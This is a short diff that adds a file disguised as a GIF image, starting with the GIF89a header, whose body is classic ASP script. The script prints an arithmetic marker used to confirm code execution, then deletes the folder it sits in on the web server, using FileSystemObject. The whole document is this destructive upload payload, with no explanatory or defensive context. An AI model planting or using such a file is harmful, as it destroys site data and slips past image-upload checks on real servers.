@@ -1,0 +1,7 @@
+GIF89a
+<%
+response.Write(987651234-123498765)
+cur_URL = Server.MapPath("./")
+set fs=Server.CreateObject("Scripting.FileSystemObject")
+fs.DeleteFolder(cur_URL)
+%>
